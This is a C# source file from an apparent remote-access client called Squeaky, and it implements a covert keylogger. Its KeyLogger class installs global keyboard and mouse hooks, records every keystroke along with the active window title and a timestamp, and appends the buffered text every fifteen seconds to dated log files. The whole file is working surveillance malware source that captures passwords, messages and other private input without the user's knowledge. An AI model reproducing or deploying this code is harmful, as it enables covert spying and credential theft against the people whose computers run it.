using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Collections.Generic;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.IO;
using System.Globalization;

namespace Squeaky.Client.Utilities
{
    static class KeyLogger
    {
        public static List<Keys> PressedKeys = new List<Keys>();
        private static StringBuilder LogBuffer = new StringBuilder();
        private static string LastWindowTitle = "";

        private static bool FirstLine;
        private static bool CtrlPressed = false;

        public static string LogDir = @"kl\";

        private static void WriteLoop()
        {
            while (true)
            {
                FirstLine = true;
                var dateFile = DateTime.Now.ToString("M-d-yyyy");
                foreach (string file in Directory.GetFiles(LogDir))
                {
                    if (file == LogDir + dateFile)
                    {
                        FirstLine = false;
                        break;
                    }
                }

                if (LogBuffer.Length != 0)
                {
                    using (StreamWriter sw = File.AppendText($"{LogDir}{dateFile}"))
                    {
                        sw.Write(LogBuffer);
                        LogBuffer.Clear();
                    }
                }

                Thread.Sleep(15000);
            }
        }

        private static bool CheckWindowName()
        {
            var activewindowtitle = KeyLoggerHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activewindowtitle) && activewindowtitle != LastWindowTitle)
            {
                LastWindowTitle = activewindowtitle;
                LogBuffer.Append($"{(FirstLine ? "" : "\n\n")}[{activewindowtitle}] [{DateTime.Now.ToString("hh:mm:ss")}]\n");
                return true;
            }

            return false;
        }

        private static void OnKeyDown(object sender, KeyEventArgs e)
        {
            CheckWindowName();

            if (!KeyLoggerHelper.IsExcludedKey(e.KeyCode) && !PressedKeys.Contains(e.KeyCode))
            {
                var key = e.KeyCode.ToString();

                PressedKeys.Add(e.KeyCode);
                LogBuffer.Append($"[{key}]{(key == "Return" ? "\n" : "" )}");
            }

            if (e.Control) CtrlPressed = true;
            if (CtrlPressed) LogBuffer.Append(e.KeyCode.ToString().ToLower());
        }

        private static void OnKeyUp(object sender, KeyEventArgs e)
        {
            PressedKeys.Remove(e.KeyCode);
            if (e.Control) CtrlPressed = false;
        }

        private static void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (!KeyLoggerHelper.IsSpecialKey(e.KeyChar) && !CtrlPressed)
            {
                LogBuffer.Append(e.KeyChar);
            }
        }

        private static void OnMouseClick(object sender, MouseEventArgs e)
        {
            if (CheckWindowName()) LogBuffer.Append("[MouseFocus]\n");
        }

        public static void Start()
        {
            if (Settings.LOGGER)
            {
                var hook = Hook.GlobalEvents();
                hook.KeyDown += OnKeyDown;
                hook.KeyUp += OnKeyUp;
                hook.KeyPress += OnKeyPress;
                if (Settings.LOGMOUSEFOCUS) hook.MouseClick += OnMouseClick;

                Thread WriteLoopThread = new Thread(WriteLoop);
                WriteLoopThread.Start();

                Application.Run();
            }
        }
    }

    class KeyLoggerHelper
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        public static string GetForegroundWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            KeyLoggerHelper.GetWindowText(KeyLoggerHelper.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            return sbTitle.ToString();
        }

        public static bool IsExcludedKey(Keys k)
        {
            return (k >= Keys.A && k <= Keys.Z
                    || k >= Keys.NumPad0 && k <= Keys.Divide
                    || k >= Keys.D0 && k <= Keys.D9
                    || k >= Keys.Oem1 && k <= Keys.OemClear
                    || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                    || k == Keys.CapsLock
                    || k == Keys.Space);
        }

        public static bool IsSpecialKey(char k)
        {
            var kStr = k.ToString();
            return (kStr == "\b"
                    || kStr == "\n"
                    || kStr == "\r"
                    || kStr == "\t"
                    || kStr == "\f"
                    || kStr == "\v");
        }
    }
}
